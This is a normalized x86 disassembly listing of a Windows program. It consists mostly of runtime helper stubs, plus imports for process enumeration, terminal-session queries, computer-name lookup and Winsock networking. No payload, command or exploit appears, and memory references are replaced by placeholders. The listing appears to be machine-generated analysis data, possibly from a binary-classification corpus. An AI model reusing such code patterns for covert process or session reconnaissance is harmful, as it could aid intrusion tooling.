push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
sub_403955
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_403975
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0x4 ]
call [ EnterCriticalSection@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
retn 0x4
sub_403995
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0x4 ]
call [ LeaveCriticalSection@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
retn 0x4
Process32NextW
jmp [ Process32NextW@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
sub_405e80
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push 0xf
push edx
call sub_405d70
add esp 0x10
retn
sub_407ed0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
call sub_40ba01
add esp 0x8
retn
sub_407ef0
mov eax [ esp + 0x8 ]
push eax
call sub_40ba40
pop ecx
retn
sub_409f10
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x28 ]
push ecx
call [ eax + 0x24 ]
add esp 0x8
retn
sub_40a630
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ rw-data ]
mov ecx [ esp + 0xc ]
mov [ edx ] eax
mov edx [ esp + 0x10 ]
xor eax eax
mov [ ecx ] rw-data
mov [ edx ] rw-data
retn
sub_40aff3
call sub_40c3e6
retn
sub_40aff9
push [ esp + 0x4 ]
call sub_40afbd
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
retn
sub_40b535
push ecx
mov [ ecx ] r--data
call sub_40d793
pop ecx
retn
sub_40b543
push esi
mov esi ecx
call sub_40b535
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40ba40
pop ecx
sub_40b55f
mov eax [ esp + 0x4 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_40d810
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
retn 0x4
sub_40b57a
push esi
call sub_40bf4b
mov esi [ eax + 0x80 ]
call sub_40bf4b
mov ecx [ esp + 0x8 ]
mov [ eax + 0x80 ] ecx
mov eax esi
pop esi
retn
sub_40b599
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_40b650
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_40ba40
pop ecx
sub_40b666
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40b673
push esi
mov esi ecx
call sub_40b650
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40ba40
pop ecx
j_sub_40ba40
jmp sub_40ba40
sub_40b886
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x2c ] ecx
push eax
push ecx
call sub_40dd5f
pop ecx
pop ecx
retn
sub_40b8c0
xor eax eax
inc eax
retn
_start
call sub_40e6cc
jmp sub_40b6f9
sub_40b9df
push 0x4
call sub_40e7fe
pop ecx
retn
sub_40ba96
push 0x4
call sub_40e7fe
pop ecx
retn
sub_40bc38
and [ rw-data ] 0x0
call sub_40f633
mov [ rw-data ] eax
xor eax eax
retn
sub_40bd26
push 0x0
call sub_40bcb8
pop ecx
retn
sub_40bd9d
call [ TlsAlloc@IAT ]
retn 0x4
sub_40becb
push 0xc
call sub_40e7fe
pop ecx
retn
sub_40c06f
push 0xd
call sub_40e7fe
pop ecx
retn
sub_40c07b
push 0xc
call sub_40e7fe
pop ecx
retn
sub_40c375
push 0x4
call sub_40e7fe
pop ecx
retn
sub_40c37e
call sub_40dd26
push [ esp + 0x4 ]
call sub_40db86
push [ rw-data ]
call sub_40bd2f
push 0xff
call eax
add esp 0xc
retn
sub_40c3a2
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ esp + 0x4 ]
call eax
sub_40c3c8
push [ esp + 0x4 ]
call sub_40c3a2
pop ecx
push [ esp + 0x4 ]
call [ ExitProcess@IAT ]
sub_40c3dd
push 0x8
call sub_40e8d6
pop ecx
retn
sub_40c3e6
push 0x8
call sub_40e7fe
pop ecx
retn
sub_40c5f9
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40e7fe
pop ecx
sub_40c60e
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_40c52c
add esp 0xc
retn
sub_40c61f
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_40c52c
add esp 0xc
retn
sub_40c630
push 0x1
push 0x0
push 0x0
call sub_40c52c
add esp 0xc
retn
sub_40c63f
push 0x1
push 0x1
push 0x0
call sub_40c52c
add esp 0xc
retn
sub_40c6e1
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40cb3f
push 0xd
call sub_40e7fe
pop ecx
retn
sub_40cefc
push 0xd
call sub_40e7fe
pop ecx
retn
sub_40cf35
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_40cd9b
pop ecx
mov [ rw-data ] 0x1
sub_40d24d
push 0xc
call sub_40e7fe
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_40d7fa
push 0xe
call sub_40e7fe
pop ecx
retn
sub_40d898
push 0x8
push r--data
call sub_40c69c
call sub_40bf4b
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_4106ac
and [ ebp - 0x4 ] 0x0
call eax
jmp sub_40d8bf
sub_40d8bf
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4106ac
sub_40d8d1
call sub_40bf4b
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_40d898
call eax
sub_40d908
xor eax eax
inc eax
retn
sub_40d91b
push sub_40d898
call sub_40bcb8
pop ecx
mov [ rw-data ] eax
retn
sub_40d9d7
push 0x4
call sub_40e7fe
pop ecx
retn
sub_40db78
push sub_40db3b
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
sub_40e5b8
xor eax eax
inc eax
retn
sub_40e7fe
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40e8cd
push 0xa
call sub_40e7fe
pop ecx
retn
sub_40e907
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_40f4b9
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_40f5e3
push 0xc
push r--data
call sub_40c69c
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_40c6e1
retn
sub_40f600
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_40f693
call sub_40f633
mov [ rw-data ] eax
xor eax eax
retn
sub_40f7e4
push 0x4
call sub_40e7fe
pop ecx
retn
sub_40f9e9
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_40fa1b
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
retn
sub_40fa68
push [ rw-data ]
call sub_40bd2f
pop ecx
retn
sub_40fbe9
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_40e7fe
pop ecx
sub_40fc25
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_40fc2f
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_40fc39
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_40fc43
push [ esp + 0x4 ]
call [ InitializeCriticalSection@IAT ]
xor eax eax
inc eax
retn 0x8
sub_40fcd9
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x24 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_40fcf0
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x24 ] 0xc0000017
jne r-xdata
and [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40c6e1
retn
push 0x8
call [ SetLastError@IAT ]
sub_40fd18
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_410b75
retn
sub_40fdfe
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
push [ ecx + 0x1c ]
push [ ecx + 0x18 ]
push [ ecx + 0x28 ]
call sub_40fd28
add esp 0xc
pop ebp
retn 0x4
sub_40fe64
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_40fd28
add esp 0xc
pop ebp
retn 0x8
sub_410680
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_410dd0
sub_410696
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_410dd0
sub_4109f3
push 0x4
push 0x0
push [ esp + 0xc ]
push 0x0
call sub_4109a2
add esp 0x10
retn
sub_410af4
push 0x2
call sub_40c37e
pop ecx
retn
sub_410d65
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_410c9c
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_410db0
call eax
retn
sub_410db3
push 0xa
push 0x0
push [ esp + 0xc ]
call sub_4110ff
add esp 0xc
retn
sub_4111a0
lea eax [ edx - 0x1 ]
pop ebx
retn
WTSQuerySessionInformationW
jmp [ WTSQuerySessionInformationW@IAT ]
WTSFreeMemory
jmp [ WTSFreeMemory@IAT ]
GetComputerObjectNameW
jmp [ GetComputerObjectNameW@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_41128c
retn
sub_41128d
mov eax sub_41235a
mov [ rw-data ] eax
mov [ rw-data ] sub_411a56
mov [ rw-data ] sub_411a14
mov [ rw-data ] sub_411a48
mov [ rw-data ] sub_4119be
mov [ rw-data ] eax
mov [ rw-data ] sub_4122d4
mov [ rw-data ] sub_4119d4
mov [ rw-data ] sub_41193e
mov [ rw-data ] sub_4118cd
retn
sub_4112ed
call sub_41128d
call sub_4123e0
cmp [ esp + 0x4 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
retn
call sub_41237b
sub_41164c
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
mov [ esi ] eax
call sub_40bf4b
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_40bf4b
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
retn
sub_411740
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_4118b2
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_410ce1
add esp 0x8
pop ebp
retn 0x4
sub_4119be
fldz
mov eax [ esp + 0x4 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
retn
xor eax eax
inc eax
retn
sub_411a14
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_4119d4
add esp 0x10
retn
sub_411a48
push 0x0
push [ esp + 0x8 ]
call sub_4118cd
pop ecx
pop ecx
retn
sub_411a56
push 0x0
push [ esp + 0x8 ]
call sub_41193e
pop ecx
pop ecx
retn
sub_411c9f
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_411bd1
add esp 0x18
pop ebp
retn
sub_412409
mov [ ecx ] r--data
jmp sub_40b650
sub_412414
push esi
mov esi ecx
mov [ esi ] r--data
call sub_40b650
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call j_sub_40ba40
pop ecx
sub_412558
push [ ebp - 0x14 ]
call sub_412492
pop ecx
retn
sub_41259c
call sub_40bf4b
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_40bf4b
add eax 0x90
dec [ eax ]
sub_41263f
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_412648
mov esp [ ebp - 0x18 ]
jmp sub_40d898
sub_4126ee
push 0x4
mov eax sub_415c22
call sub_413a79
call sub_40bf4b
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40d8d1
call sub_40d8e4
sub_4127c7
mov eax [ ebp - 0x14 ]
call sub_4125b7
retn
sub_412a3e
xor eax eax
inc eax
retn
sub_412a42
mov esp [ ebp - 0x18 ]
jmp sub_40d898
sub_412ad7
xor eax eax
inc eax
retn
sub_412adb
mov esp [ ebp - 0x18 ]
jmp sub_40d898
sub_412f97
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_40b5f8
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_4133cc
mov ecx [ ebp - 0x14 ]
mov edx [ ecx ]
mov eax [ edx ]
xor ecx ecx
cmp eax 0xc0000005
sete cl
mov eax ecx
retn
sub_413aaf
xor eax eax
inc eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
retn
xor eax eax
sub_415af0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_415b35
mov ecx [ ebp + 0x8 ]
jmp sub_40b650
sub_415b3d
mov eax r--data
jmp sub_411401
sub_415b47
mov ecx [ ebp - 0x10 ]
jmp sub_40b650
sub_415b4f
mov eax r--data
jmp sub_411401
sub_415b59
mov ecx [ ebp + 0x8 ]
jmp sub_401b9f
sub_415b61
mov eax r--data
jmp sub_411401
sub_415b6b
mov ecx [ ebp - 0x10 ]
jmp sub_401b9f
sub_415b73
mov eax r--data
jmp sub_411401
sub_415b7d
mov eax r--data
jmp sub_411401
sub_415b87
mov eax r--data
jmp sub_411401
sub_415b91
mov eax r--data
jmp sub_411401
sub_415b9b
mov eax r--data
jmp sub_411401
sub_415ba5
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_415bb3
mov eax r--data
jmp sub_411401
sub_415bbd
lea esi [ ebp - 0x228 ]
jmp sub_401334
sub_415bc8
mov eax r--data
jmp sub_411401
sub_415bd2
lea esi [ ebp - 0x30 ]
jmp sub_401334
sub_415bda
mov eax r--data
jmp sub_411401
sub_415be4
lea esi [ ebp - 0x40 ]
jmp sub_401334
sub_415bec
lea esi [ ebp - 0x30 ]
jmp sub_401334
sub_415bf4
lea esi [ ebp - 0x20 ]
jmp sub_401334
sub_415c04
mov eax r--data
jmp sub_411401
sub_415c0e
mov esi rw-data
jmp sub_401334
sub_415c18
mov eax r--data
jmp sub_411401
sub_415c22
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40fd18
mov eax r--data
jmp sub_411401
sub_415c70
cmp [ rw-data ] 0x0
jne r-xdata
push sub_415f42
call sub_40aff9
pop ecx
retn
call sub_4038a9
sub_415c8a
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ WSAStartup@IAT ]
push WSACleanup
call sub_40aff9
add esp 0x194
retn
sub_415e0f
mov ecx rw-data
jmp sub_401b03
sub_415e7a
mov ecx rw-data
jmp sub_401b03
sub_415e84
push esi
mov [ rw-data ] sub_4057d1
mov [ rw-data ] 0x802f4100
mov [ rw-data ] 0x64
call sub_402a24
mov esi eax
call sub_402714
pop esi
retn
sub_415eb1
push esi
mov [ rw-data ] sub_405839
mov [ rw-data ] 0x30302301
mov [ rw-data ] 0xa
mov [ rw-data ] 0x927c0
call sub_402a24
mov esi eax
call sub_402685
pop esi
retn
sub_415f1f
push esi
mov esi [ DeleteCriticalSection@IAT ]
push rw-data
call esi
push rw-data
call esi
push [ rw-data ]
call [ CloseHandle@IAT ]
pop esi
retn
sub_415f42
retn
WSACleanup
jmp [ WSACleanup@IAT ]
